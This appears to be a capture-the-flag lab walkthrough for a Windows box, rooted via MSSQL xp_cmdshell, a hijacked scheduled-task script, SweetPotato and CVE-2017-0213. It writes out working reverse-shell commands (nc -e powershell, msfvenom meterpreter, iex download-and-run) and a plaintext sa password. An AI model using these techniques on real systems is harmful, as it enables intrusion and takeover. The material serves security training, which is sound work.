Shell as sarah
--------------
- there are two ways in which we can get shell as sarah

	- Execution via MSSQL
	- Exploit Firefox CVE-2016-1960

Execution via MSSQL
-------------------
- we can use impackets mssqlclient.py to connect to MSSQL

	mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59

- mssqlclient.py has built in commands 
- we can use xp_cmdshell to run unix commands

	enable_xp_cmdshell
	xp_cmdshell whoami

- we get output as tally\sarah
- since we are running on a 32 bit shell we can get a reverse shell to make things much easier 
- choose a powershell reverse shell 
- we can choose the powershell base64 reverse shell from revshells.com
- change the ip and port 
- setup a listener with netcat

	rlwrap -cAr nc -lvnp 443

- run the reverse shell

	xp_cmdshell powershell -e base64_encoded_reverse_shell

- we have a shell as sarah
- grab the user flag

Priv-esc
--------
- we can get a shell as system in 3 different ways
	- Overwrite Scheduled Task
	- SeImpersonate token
	- CVE-2017-0213

System shell with Overwrite scheduled task
------------------------------------------
- during enumeration we saw a bunch of files in the desktop out of which SPBestWarmUp.ps1 and SPBestWarmUp.xml looks interesting to us 
- SPBestWarmUp.ps1 is a powershell script 
- SPBestWarmUp.xml is an exported scheduled task which runs like a cronjob every 1 hour running as Administrator
- checking the xml we can see that it runs SPBestWarmUp.ps1
- sarah has full control over SPBestWarmUp.ps1

	icacls SPBestWarmUp.ps1

- we can generate another reverse shell for port 444 and replace the contents of SPBestWarmUp.ps1

	echo "reverse_shell_444" > SPBestWarmUp.ps1

- setup a listener 

	rlwrap -cAr nc -lnvp 444

- we got a shell as system
- grab the root flag

System shell with SeImpersonate token
-------------------------------------
- sarah is running MSSQL and in windows its very common for services to run as a user with SeImppersonate privileges 
- we can check this by running the following command as sarah

	whoami /priv

- we do have SeImpersonatePrivilege 
- we can use sweetpotato to exploit this 
	
	https://github.com/CCob/SweetPotato

- we can download it and get it on the victim machine 
- get nc64.exe on the victim machine 
- run the following code 

	.\sp.exe -p "\programdata\nc64.exe" -a "-e powershell 10.10.14.6 446"

- setup a listener with netcat

	nc -lnvp 446

- we have a shell as system

System shell with CVE-2017-0213
-------------------------------
- we can check systeminfo to look for recent hotfixes
- the hotfix KB4015217 is exploitable
- CVE-2017-0213 was a well know privesc in Windows
- a note from sarahs desktop tells us that any accurance of cmd.exe outside of windows folder will not be executed 
- the CVE-2017-0213 explot runs cmd.exe so we need to find a better way to exloit this 
- we will download the C++ source for this exploit
- Instead of cmd.exe, we just have to run 

	nc64.exe -e powershell 10.10.14.6 447

- build the exploit as x86 in vs code
- now we need to check for pid of the powershell
	
	get-process -id $PID

- we can use metasploit for this since its easier to migrate in msfconsole
- generate a payload with msfvenom

	msfvenom -p windows/x64/meterpreter/reverse_tcp -f psh -o met.ps1 LHOST=10.10.14.6 LPORT=4443

- start msfconsole 
	
	msfconsole
	use exploit/multi/handler
	set LHOST
	set LPORT
	run

- start a python server and host the payload
- downloadand run the exploit in victim machine

	iex(iwr http://10.10.14.6/met.ps1)

- we get a meterpreter shell
- run ps to check for running processes and migrate to a running session (explorer.exe)  

	migrate 4168

- from an interactive process we can run the exploit 
- shell to drop into a shell 
- change directory to C:\programdata and run the exploit we built from here
- the exploit was setup to call nc64.exe to our host port 447
- setup a listener with netcat

	nc -lnvp 447

- we got a shell as ny authority\system
- grab the root flag
